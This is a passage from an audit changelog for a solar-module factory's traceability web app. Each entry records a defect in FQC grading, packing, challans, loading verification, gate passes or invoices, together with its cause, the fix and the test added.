  reads ISO, DD-MM-YYYY, DD/MM/YYYY, DD.MM.YYYY, D-Mon-YY; one it cannot read is
  refused at confirm and blocks at the challan pre-check. A blank invoice number is
  refused with a reason (was a NOT NULL 500).
- **Open (Mukesh):** invoice numbers repeating across financial years would make a new
  year's invoice supersede last year's - as in the original design. Do they repeat?
- **Test:** `test_invoice_confirm.py` (new, 5, synthetic PDFs; all fail before).
  From `audit/A4-invoice-challan` 5f57376.

### Loading Verification confirmed and submitted challans that are not issued
- **Found** by A5 (Chromium, then API): a session left open while Team 2 edited the
  challan (MA) went on confirming and submitting the SUPERSEDED original and wrote a
  module gate pass for it; a direct call did the same for a draft (serials never
  dispatched) and a cancelled challan. A confirm on an already loaded pallet (a second
  screen still open) put it back to `saved` and the challan then refused to print. A
  pallet number sent as a number was a 500.
- **Cause:** confirm read only that the challan exists; submit only the pallet statuses.
- **Change:** `_loading_not_live()` refuses anything but an issued challan before
  either route writes - a superseded original names the live version to load instead
  (DECISIONS 4: no swap, rescan the new version); confirm refuses a loaded pallet.
- **Test:** `test_loading.py` +4. From `audit/A5-load-gatepass-print` 1b89366.

### Loading Verification refused the pallet's QR
- **Found** by A5: scanning the packing list's QR (`ICONTRACE|BOX|<number>|...`) into a
  session was refused "not on this challan"; the contents check said "not a pallet
  number". DECISIONS 4: type or scan a pallet number OR its QR.
- **Change:** one helper takes the number out of the QR (server `_pallet_no_from_scan`,
  page `ldPalletNo`).
- **Test:** `test_loading.py`, `test_loading.js`; Chromium on the audit server.
  From `audit/A5-load-gatepass-print` 89caa24.

### "Verify one pallet's contents" matched nothing
- **Found** by A5 (Chromium): a module scanned + Enter did nothing - 0 matched,
  0 unexpected - so the not-opened-since-packing check could not be done.
- **Cause:** the "Back" bar was put in front by re-assigning the section's innerHTML
  after the fragment's script had wired it, which dropped the scan field's listener.
- **Change:** `insertAdjacentHTML('afterbegin', ...)`.
- **Test:** `test_loading_ui.py` (new, Chromium). From `audit/A5-load-gatepass-print` e13cdad.

### "Verify one pallet's contents": a scanned pallet waited for a click
- **Found** by A5: the pallet field had no Enter handler, so a scan (which ends with
  Enter) loaded nothing until "Load its serials" was clicked.
- **Change:** Enter in the pallet field loads it, as the button does.
- **Test:** `test_loading_ui.py` +1. From `audit/A5-load-gatepass-print` d155c15.

### (test) A cancelled module gate pass releases its challan on screen too
- A5 found and fixed the same defect as A4's d3fa85d above, independently; its code
  change is already in. Its test is kept: `test_gatepass.py` +1 (after the module gate
  pass is cancelled, list and detail read gp_count 0, not locked, and edit opens).
  From `audit/A5-load-gatepass-print` 46d4de8 (test only).

### The challan detail's "Verify loading" did nothing
- **Found** by A5 (Chromium): it closed the panel, stayed on the Challan list and
  toasted "Challan #6 - find its boxes on this screen by box number" (the internal id,
  and no such screen) - a button that did nothing.
- **Cause:** `clVerifyLoading()` called `go('loading')`, a view that does not exist.
- **Change:** it opens that challan's session (`ldOpenSession`), offered only to an
  account that can view Loading Verification.
- **Test:** `test_loading_ui.py` +1 (Chromium). From `audit/A5-load-gatepass-print` e1dc88c.

### A reject could reach Quality with no defect on file
- **Found** by A2 in the browser (ICON625R12A0830032): the EL image was filed under
  "Corner Chip", a folder the defect list does not know; the operator cleared the
  prefilled box and the reject was saved with no defect (`fqc_defect` empty).
- **Cause:** the route asked "is the EL verdict not clean?", while `db.record_fqc`
  attaches the EL defect only through `icon_defects.FOLDER_MAP` - two questions.
- **Change:** `_reject_needs_defect()` asks what `record_fqc` asks; an unmapped folder
  needs an operator defect and the refusal names the folder.
- **Test:** `test_fqc.py` +1. From `audit/A2-fqc-quality` 76e96d8.

### A rescan of a packed module skipped the FQC rules - a short module came out grade A
- **Found** by A2 (ICON625R12A0830021): a GY module measuring 620.5 W (nameplate 625),
  rescanned as a PASS, was recorded as a pass grade A, and the Incharge's "Keep the
  rescanned" made it a packable A (DECISIONS 5: a reading below wattage can never be
  overruled). A rescan reject needed no defect; a stale screen was not told the reading
  had moved; a rescan passed with the Sun Simulator unreachable was kept graded A blind.
- **Cause:** `/api/fqc` returned into `_handle_duplicate_scan` before the token, pass
  route and defect checks; keeping the rescan set `graded` for any pass.
- **Change:** the rescan is judged by the same rules as a first decision; a provisional
  rescan pass carries no grade and, kept, puts the module on hold like any held pass.
  `test_review.py`'s rescan rejects now name a defect, as every rejection must.
- **Test:** `test_review.py` +3. From `audit/A2-fqc-quality` e7c7388.

### Needs Review: a held rescan / disagreeing reading was a second live decision
- **Found** by A2: until resolved, a duplicate-scan rescan and the reading that disagreed
  with a provisional decision were LIVE `fqc_record`s beside the decision they disagree
  with - the FQC Dashboard counted 16 inspected for 13 modules, Recent gradings listed
  them twice, FQC Entry showed the rescan as "Existing decision", a SECOND rescan was
  compared with the first rescan ("confirms the reject already on file" for a module
  packed as a pass), and an FQC cancel could leave the other record live.
- **Change:** the held record is born superseded by the decision it disagrees with and is
  reinstated when a person keeps it (`db.reinstate_fqc`); a rescan while a conflict is
  already open is refused, naming the item (one conflict at a time). `serve.py` runs
  `db.settle_held_for_review` at start for items raised before this: it supersedes the
  held record of each OPEN duplicate-scan / provisional-mismatch item (two columns,
  nothing deleted). **On production that is the one open provisional mismatch, at the
  next restart on this code.**
- **Test:** `test_review.py` +1, `test_fqc.py` mismatch case (one live record,
  inspected == 1). From `audit/A2-fqc-quality` 9f98e70.

### Hold & Deviation "reconciled" a decision that had the Sun Simulator reading
- **Found** by A2 (ICON625R12A0830039): a reject made at 630 W while the EL image was not
  filed yet was mode `provisional`; the next read of Hold & Deviation flagged it as a
  provisional mismatch ("decided reject without the reading; it says pass") and moved the
  module from `rejected` to `hold`, out of Quality's queue.
- **Cause:** `provisional_pending` took every provisional decision, while the reconcile
  only checks the Sun Simulator - the EL never gates a decision.
- **Change:** a decision whose snapshotted `ss_state` was OK waits for nothing. Items
  already raised this way stay for Quality (keep the decision).
- **Test:** `test_fqc.py` +1. From `audit/A2-fqc-quality` a68f18b.

### FQC Entry told a rescan of a packed module "ready to pack" / "Quality decides"
- **Found** by A2 (Chromium): after a Pass or Reject on a packed module the toast said
  "passed - grade A, ready to pack" (a rescan that only confirmed the record) or
  "rejected - Quality decides GY or BGY" (one flagged to the Incharge) - neither true
  (DECISIONS 1: no fake success).
- **Change:** a duplicate-scan answer toasts the server's own sentence.
- **Test:** `test_fqc_screen.py` +1 (Chromium). From `audit/A2-fqc-quality` 31d969f.

### Tax Invoice list named dead challans; the Create Challan picker lost invoices older than the newest 100
- **Found** by A4: an invoice whose challans were cancelled / superseded read "Challan
  2026/1, 2026/1, 2026/1, 2026/2" (fy/seq, dead ones included) and lost its action
  button; with 101 claimed invoices newer than one still waiting, the waiting one never
  reached the picker.
- **Cause:** `c.status != 'CANCELLED'` (upper case - everything matched; superseded not
  excluded); `/api/invoices` dropped claimed and cancelled invoices AFTER
  `search_invoices`' LIMIT 100.
- **Change:** both filters run in the query before the limit; the column names the live
  challans by number.
- **Test:** `test_challan.py` +2. From `audit/A4-invoice-challan` eedbcc5.

### An invoice the parser found no quantity on could never be attached
- **Found** by A4 (Chromium): "Cannot read properties of null (reading 'toLocaleString')"
  on load and on every keystroke; Attach never enabled; the rail kept the previous
  invoice's status.
- **Cause:** the live layer set `INV_SCANNED = null` and v4's `invCheck` calls
  `INV_SCANNED.toLocaleString()`.
- **Change:** the parse records `qtyParsed`; when false the typed quantity is compared.
  The synthetic PDF builder is shared as `invoice_pdf_fixture.py`.
- **Test:** `test_invoice_screen_ui.py` (new, Chromium). From `audit/A4-invoice-challan` f24bb2a.

### The invoice screen called an e-Way Bill valid until today "expired"
- **Found** by A4 (Chromium): valid upto 9-Oct-2026, on 9 Oct - "e-Way Bill is expired.
  Dispatch is blocked", Attach off; the server accepts it (a bill is valid through its
  last day). A date typed 08/10/2026 was not read at all.
- **Cause:** v4's `invCheck` compares the START of the last valid day and reads
  DD-MM-YYYY only.
- **Change:** the live layer's `invCheck` patch reads ISO / DD-MM-YYYY / DD/MM/YYYY /
  DD.MM.YYYY and hands v4 the day after the last valid day - one rule with the server.
- **Test:** `test_invoice_screen_ui.py` +1. From `audit/A4-invoice-challan` 5fd2e2f.

### Tax Invoice list: "Edit" could not save - now "View"
- **Found** by A4: Edit loaded a stored invoice into the upload screen with Attach on;
  Attach re-parsed whatever PDF was pending in the session and posted the stored fields
  with it ("That upload expired", or the wrong PDF). No server route edits a stored
  invoice (DECISIONS 1: never silently rewritten; no fake success).
- **Change:** the button is View; Attach stays off with the reason (an Admin cancels, HO's
  corrected PDF is uploaded).
- **Open (Mukesh):** if invoices should be editable, that is a new route and a rule.
- **Test:** `test_invoice_screen_ui.py` +1. From `audit/A4-invoice-challan` 8cd44a2.

### Picking the same invoice PDF a second time did nothing
- **Found** by A4: the hidden file input kept its value, so no change event fired.
- **Change:** cleared once read; the second pick is read and says "already on file".
- **Test:** `test_invoice_screen_ui.py` +1. From `audit/A4-invoice-challan` 40e5b86.

### Hold & Deviation: a confirmed held pass moved to the shift the reading arrived in
- **Found** by A2: a pass decided 23:40 on 8 Oct (C) with the Sun Simulator unreachable, confirmed at 06:09 on 9 Oct, moved on the FQC Dashboard from 8 Oct C to 9 Oct A (DECISIONS 8: counted by when the decision happened).
- **Cause/Change:** the reconcile's confirming record was stamped with the reconcile time; `record_fqc` now takes the decision's time for a record the system writes on a person's behalf.
- **Test:** `test_fqc.py` +1. From `audit/A2-fqc-quality` 544882f.

### Needs Review: a module failing again, or looked up again, became a second open item
- **Found** by A2 on the live poller: a module that failed at 23:30 and again at 23:50 was two open "FTR anomaly - failed reading" items; each lookup of an undecided module its own "Looked up, no decision" (production: 258 + 101 open).
- **Change:** while an item of that type is open for the module on that line, the event is not raised again; once acknowledged, a new failure raises a new item.
- **Test:** `test_icon_ingest.py` +1. From `audit/A2-fqc-quality` e21c415.

### FQC Dashboard: "View anomalies" listed Line A only
- **Found** by A2: the Anomaly count read 4 across both lines, its View listed Line A's one - the request sent the FQC Entry station's line (A by default) on a plant-wide screen.
- **Change:** both testers are read; a Line column; tester text escaped.
- **Test:** `test_fqc_screen.py` +1 (Chromium). From `audit/A2-fqc-quality` 033632d.

### Create Challan's selection line showed v4's demo totals
- **Found** by A4: "9 boxes · 290 modules · 182.7 KW" (v4 demo) on a fresh screen, after picking an invoice, on opening an edit and after Cancel edit.
- **Change:** the line is drawn with the pallet table after every load, check and toggle.
- **Test:** `test_challan_edit_ui.py` +1. From `audit/A4-invoice-challan` f0f6ff2.

### Loading Verification list: the row count disagreed with the search
- **Found** by A5: a search matching only the Date column left the row shown while the badge read "0 of 4 rows".
- **Change:** `ldRecount()` matches the row's rendered text, as icon_table.js searches.
- **Test:** `test_loading_ui.py` +1. From `audit/A5-load-gatepass-print` 0467ccb.

### Loading Verification list: Reset left the dates and status
- **Found** by A5: Reset emptied only the search box.
- **Change:** Reset also puts From / To back to the day the list opens on and Status to All.
- **Test:** `test_loading_ui.py` +1. From `audit/A5-load-gatepass-print` aa42f60.

### Loading Verification and Gate Pass lists opened on the calendar day after midnight
- **Found** by A5 at 05:53 on 9 Oct (C shift of 8 Oct): the Loading list did not show a challan issued 23:00 on 8 Oct and waiting to be loaded; the Gate Pass list the same.
- **Cause:** both defaulted to the calendar date and filtered the date printed on the document (`challan_date`, which Edit can change; `gp_date`). DECISIONS 8: counted by when it happened, on the factory day.
- **Change:** the loading list filters the factory day of the issue time, the gate pass list of `created_at`; both open and Reset on the factory day; the pickers still stop at the calendar date. The list shows when each challan was issued.
- **Test:** `test_loading_ui.py` (browser clock pinned to 01:00 / 11:00). From `audit/A5-load-gatepass-print` fec2d5f.

### The challan's Excel copy printed an average wattage and a rounded kW
- **Found** by A5: a 625 W + 620 W truck read "Wattage 624.5" and kW 44.38 where the printed challan says 44.375; Consignee / Ship to blank when the same party (DECISIONS 2: one goods line per model, kW exact, never an average; both parties named).
- **Change:** one goods helper for both documents; the Excel reads `print_context`: a goods table one line per model (-DCR), exact kW, the consignee / ship-to v1 prints. Pallet table and FTR sheet unchanged.
- **Test:** `test_challan_excel.py` (new, 3). From `audit/A5-load-gatepass-print` 1ee1806.

### A void challan's documents were still produced
- **Found** by A5: the FTR of an edited original printed (Print / Excel refused it); a cancelled challan whose pallets had been loaded printed, exported and reported as a live Dispatch Challan cum Gate Pass.
- **Change:** `_refuse_not_produced()` (superseded: names the live number; cancelled: says when and why) first in print, Excel and FTR. The FTR stays outside the loading gate (DECISIONS gates v1 / v2 only).
- **Test:** `test_loading.py` +2. From `audit/A5-load-gatepass-print` a186e4b.

### Search & Trace: a dispatched module's journey stopped at the challan number
- **Found** on the A7 golden path: no word of the version it replaced, who issued it and when, who loaded the pallet, or the gate pass; the event log had no dispatch row (DECISIONS 1: the module journey shows the history).
- **Change:** the Challan step names who / when / the version replaced; a Gate pass step (or "awaiting Loading Verification"); the event log adds challan, loading and gate pass events.
- **Test:** `test_loading.py` +1. From `audit/A7-golden-volume` 5aa1b57.

### Gate Pass: a new pass holds the edit's rules
- **Found** by A5: POST /api/gatepass stored type "XYZ" (printed as RGP in classic), an
  empty numbered pass with no party or item, an expected return "not-a-date" or in the
  past, an NRGP with a return date, and a browser-sent challan_no ("Against challan ..."
  on a standalone pass).
- **Cause:** create validated only item rows; type and return date were never checked;
  the challan no. came from the body.
- **Change:** `_gp_kind_and_return()` for create and edit (NRGP / RGP; a return date on an
  RGP only, a real date not before today); a standalone pass needs a party and items (or
  the old single description); the challan no. only from the linked row.
- **Test:** `test_gatepass_multiitem.py` +4. From `audit/A5-load-gatepass-print` daba643.

### A drill-in from the Production Dashboard or Management Overview inherited the FQC Dashboard's filters
- **Found** on the A7 volume run: Production Dashboard "View 1695" opened a list of 5
  when the FQC Dashboard had been left on Shift C + "Rejected only"; Management
  Overview's "View N" the same.
- **Cause:** `openModules()` started from `fqcDashFilters()`, the FQC Dashboard's own
  controls, whatever screen called it.
- **Change:** it starts from them only when the FQC Dashboard is the screen on view.
- **Test:** `test_dashboards_e2e.py` +1 (28). From `audit/A7-golden-volume` 23230cd.

### Quality could not return a reject to A once the shift's CSV was cut
- **Found** by two audit agents independently (A2 from the code, A7 at volume: 31 of 31
  "A" attempts refused): a full-power reject waiting for Quality was refused "the reading
  is unavailable" once its live CSV row had been cut and pasted away - although FQC had
  judged, and kept, that very reading. And a module that measured short (610 W) was
  refused with the same "the reading is unavailable" instead of what it measured.
- **Cause:** `_grade_quality` re-read the live source only (`ev.gather`), not the reading
  every decision keeps (`_keep_reading` -> `ftr_reading`), which FQC's own lookup falls
  back to (`_fqc_payload`); and it quoted `e.get("why")`, which `gather()` never sets.
- **Change:** with the tester reachable and the row gone (NA) the kept reading is the
  measurement, as in FQC's lookup; an unreachable tester (NC) changes nothing. The rule
  is unchanged - A still needs Pmax at or above the nameplate. The refusal says what the
  module measured, or that the tester could not read it.
- **Test:** `test_fqc.py` +1, and the short-module case asserts the measured 620.5 W
  (both fail before; 58 passed after). `test_review.py`, `test_fqc_unplanned.py`.

### Editing an indent brought a cancelled item back to life
- **Found** by A1 (browser): after Admin > Cancel document cancelled one item, the indent's Edit showed it as an ordinary row and Save deleted every item row - the cancelled one with its who / when / why - and re-created them all live; the item returned to the list and to Planning (DECISIONS 1: cancelled, never deleted or silently rewritten).
- **Cause:** GET /api/indent/<no> returned cancelled items; PUT deleted every indent_line before re-inserting.
- **Change:** Edit carries live items only; the PUT deletes and re-numbers live items only - a cancelled item keeps its row, number and reason, and a new item never takes its number.
- **Test:** `test_indent.py` +1. From `audit/A1-plan-produce` 60be4f1.

### Indent list interleaved two indents of the same date
- **Found** by A1: OCT-09/A item 1, OCT-09/B item 1, OCT-09/A item 2 ... on the list and its export.
- **Change:** ordered by date, then indent, then item.
- **Test:** `test_indent.py` +1. From `audit/A1-plan-produce` 852300c.

### An allocation's range, quantity and customer came from the request
- **Found** by A1: every Planning batch showed "0 - 0" under its quantity on Search & Trace (the screen never sends seq_from / seq_to); POST /api/allocation with a quantity and no serials wrote an allocation with no serial behind it, its range (7..9999) and customer ("SOMEONE ELSE") from the request; a bad material row was refused only AFTER the insert, leaving an empty allocation (DECISIONS 1: the server is the authority).
- **Change:** the range is read from the serials (`_alloc_seq_span`), the customer is the indent's (as on its serial rows), a request with no serials is refused before anything is written, material rows are parsed first. The running-production guard is untouched.
- **Test:** `test_custom_serials.py` +1. From `audit/A1-plan-produce` cc1179c.

### New Pallet's remove set any serial to graded
- **Found** by A3: POST /api/box/<id>/remove set the named serial `graded` whether or not that pallet held it - a module waiting on Quality, on hold, packed elsewhere, dispatched or cancelled read graded afterwards (API, or a stale second tab).
- **Change:** a serial the pallet does not hold is refused, naming the pallet, before anything is written.
- **Test:** `test_packing.py` +1. From `audit/A3-pack` 41b2cf3.

### Packing Log: Awaiting challan read 26,130 kW for 418 modules; Repack sessions always 0
- **Found** by A3: the tile took the wattage from the MODEL's digits (ISEN625-G12R -> 62512 W); Repack sessions counted a state no pallet has.
- **Change:** /api/packing/log gives each row its kW (its modules' wattage, summed / 1000) and a repack summary for the period.
- **Test:** `test_packlog.py` (new). From `audit/A3-pack` 553b45f.

### Packing Log: both donuts showed v4's demo picture
- **Found** by A3: Box and Grade composition kept v4's sample proportions beside a legend of the real numbers.
- **Cause:** colours C.mute / C.fail do not exist in v4's palette - the conic-gradient carried "undefined" and the browser kept the old background.
- **Change:** real palette colours (Stock & Dispatch's BGY red).
- **Test:** `test_packlog.py` +1 (Chromium). From `audit/A3-pack` db8fa80.

### Packing Log: Reset blanked the date and drew twice
- **Found** by A3: Reset listed every pallet ever (blank date) and sent two requests with different dates.
- **Change:** its own Reset - the factory day, every dropdown to its first option, one draw (as the Production Dashboard's).
- **Test:** `test_packlog.py` +1 (Chromium). From `audit/A3-pack` 3810b83.

### Packing Log: the Boxes row count went stale
- **Found** by A3: "26 rows" beside 24 listed; a day with none counted its "Nothing found" line.
- **Change:** the empty line is marked and the table layer recounts after every draw.
- **Test:** `test_packlog.py` +1 (Chromium). From `audit/A3-pack` 44063ed.

### Settings: the /settings form skipped the barcode limits; a pallet ceiling of 'abc' broke New Pallet
- **Found** by A3: the older /settings form stored a 104 mm barcode in an 84 mm room (DECISIONS 7: the server refuses it) and an unknown print format; neither route checked the pallet ceiling - 'abc' made every New Pallet open a 500, '0' made every pallet impossible.
- **Change:** one `_settings_clean()` behind both routes (print format, barcode with the overflow check, pallet ceiling a whole number >= 1); a refused form stores nothing (400).
- **Test:** `test_barcode_text.py` +1. From `audit/A3-pack` f54fc9f.

### New Pallet: a pallet opened as a grade, model or capacity no module can be
- **Found** by A3 (API): grade 'Z' or an unknown model opened a box named by its bare
  sequence ("31") whose packing list was a 500; capacity 'abc' or 0 silently became 36.
- **Change:** grade must be A / GY / BGY, the model must be in the model master (stored
  as the master spells it), and a capacity that is not a whole number is refused.
- **Test:** `test_packing.py` +1. From `audit/A3-pack` 0acfd70.

### Planning's Withdraw could never withdraw; a withdrawal took no reason
- **Found** by A1: Withdraw on Recent Allocations sent a bare DELETE, so the server refused every press ("Enter your authenticator code to cancel.") - no batch could be withdrawn from Planning; it was also shown to a Production Incharge, whom the server refuses. DELETE /api/allocation never checked or recorded a reason - the one cancel of ten that did not (DECISIONS 1).
- **Change:** Withdraw asks for a reason and the authenticator code (as the challan's Cancel does), offered to Admin / Super Admin only; the server refuses a blank reason (400, before the code is spent) and writes it on the planning.cancel audit row. DECISIONS 1: "nine cancel routes" -> ten. The running-production guard is unchanged.
- **Test:** `test_alloc_withdraw_ui.py` (new, Chromium); `test_cancel_documents.py` blank-reason test +1 route. From `audit/A1-plan-produce` cb96da5.

### The traceability import recorded whatever range it was sent back
- **Found** by A1: /apply took /parse's ranges back from the browser and checked none of it again - an edited range backfilled ICON625R12A0730001-5 as 630 W ISEN630-G12R modules, "produced", under an entry dated 2027-01-15; customer code and rework flag came from the request too (DECISIONS 12 / 5: the serial's wattage is the nameplate).
- **Change:** `_import_range_checked()` re-reads each range from its start and end serial; running numbers, quantity, wattage and model come from the serials and a sent value that disagrees is refused, naming it; the customer is resolved again from the file's text; a non-date, a shift not A/B/C and a shift not yet started are refused (backfill keeps only its exemption from the 30-day limit).
- **Test:** `test_traceability_import.py` +1. From `audit/A1-plan-produce` f93a942.

### The server allocated a G2X serial on a G12R item of the same wattage
- **Found** by A1: ICON600G... serials were accepted on an ISEN600-G12R item and stored as G12R modules; Planning's screen refuses this, the server compared the wattage only.
- **Change:** `_nameplate_refusal` also refuses a serial whose family letter is not the item model's, on create and edit, before anything is written.
- **Test:** `test_custom_serials.py` +1. From `audit/A1-plan-produce` 0a42149.

### An indent's per pallet 'abc' was a 500; bad dates and build types were stored
- **Found** by A1: POST /api/indent with pallet_qty 'abc' answered 500 and -5 was stored; an indent date 'not a date' and build type 'make_to_whatever' were stored as sent (Packing reads the build type).
- **Change:** `_pallet_qty()` (blank, or a whole number 1 to the ceiling) and `_indent_head_errors()` (real dates, one of the two build types), on create and edit.
- **Test:** `test_indent.py` +1. From `audit/A1-plan-produce` 70e166e.

### The challan Cancel button said "Failed: Unexpected token" - even when the cancel worked
- **Found** by A4 (Chromium): a wrong code AND a successful cancel both showed "Failed: Unexpected token '<' ..."; after the right code the challan WAS cancelled but the panel stayed open and the operator was told it failed (test_challan_cancel_ui checked only the database).
- **Cause:** `clCancelChallan()` passed the Response to `api()` as a path - it fetched '/api/[object Response]'.
- **Change:** the cancel goes through `api()`: a refusal names its reason; a cancel closes the panel and reloads the list.
- **Test:** `test_challan_cancel_ui.py` +1 (fails before). From `audit/A4-invoice-challan` 6a6c4af.
